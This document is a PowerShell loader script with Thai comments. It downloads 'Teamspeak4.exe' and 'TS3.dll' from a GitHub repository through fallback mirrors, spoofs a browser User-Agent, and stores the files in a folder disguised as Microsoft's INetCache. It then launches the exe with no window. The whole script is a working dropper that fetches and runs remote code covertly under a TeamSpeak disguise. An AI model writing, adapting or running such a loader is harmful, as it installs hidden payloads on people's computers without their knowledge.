# loader.ps1 — robust version
$ErrorActionPreference = 'Stop'
$ProgressPreference    = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ---- fallback URLs (ถ้าอันแรก fail ลองอันถัดไป) ----
$urls = @(
    "https://raw.githubusercontent.com/kanokpoltankaew712-gif/Teamspeak4cvrftg/main",
    "https://cdn.jsdelivr.net/gh/kanokpoltankaew712-gif/Teamspeak4cvrftg@main",
    "https://raw.githack.com/kanokpoltankaew712-gif/Teamspeak4cvrftg/main"
)

# ---- target dir (ใช้ LOCALAPPDATA เลี่ยงสิทธิ์) ----
$dir = Join-Path $env:LOCALAPPDATA "Microsoft\INetCache\cache"
if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }

$exeName = "Teamspeak4.exe"
$dllName = "TS3.dll"
$exePath = Join-Path $dir $exeName
$dllPath = Join-Path $dir $dllName

# ---- download helper (หลายวิธี fallback) ----
function Get-File($url, $dst) {
    # วิธี 1: WebClient
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
        $wc.DownloadFile($url, $dst)
        if (Test-Path $dst) { return $true }
    } catch {}

    # วิธี 2: Invoke-WebRequest
    try {
        Invoke-WebRequest -Uri $url -OutFile $dst -UseBasicParsing `
            -Headers @{'User-Agent'='Mozilla/5.0'} -TimeoutSec 120
        if (Test-Path $dst) { return $true }
    } catch {}

    # วิธี 3: HttpClient
    try {
        Add-Type -AssemblyName System.Net.Http
        $hc = New-Object System.Net.Http.HttpClient
        $hc.DefaultRequestHeaders.Add('User-Agent','Mozilla/5.0')
        $bytes = $hc.GetByteArrayAsync($url).Result
        [IO.File]::WriteAllBytes($dst, $bytes)
        if (Test-Path $dst) { return $true }
    } catch {}

    return $false
}

# ---- ดาวน์โหลด .exe ----
if (-not (Test-Path $exePath)) {
    foreach ($u in $urls) {
        if (Get-File "$u/$exeName" $exePath) { break }
    }
}

# ---- ดาวน์โหลด .dll ----
if (-not (Test-Path $dllPath)) {
    foreach ($u in $urls) {
        if (Get-File "$u/$dllName" $dllPath) { break }
    }
}

# ---- ตรวจสอบ ----
if (-not (Test-Path $exePath)) {
    Write-Host "download failed: $exeName"
    return
}
if (-not (Test-Path $dllPath)) {
    Write-Host "download failed: $dllName"
    return
}

# ---- รัน ----
$psi = New-Object Diagnostics.ProcessStartInfo
$psi.FileName         = $exePath
$psi.WorkingDirectory = $dir
$psi.UseShellExecute  = $false
$psi.CreateNoWindow   = $true
[Diagnostics.Process]::Start($psi) | Out-Null
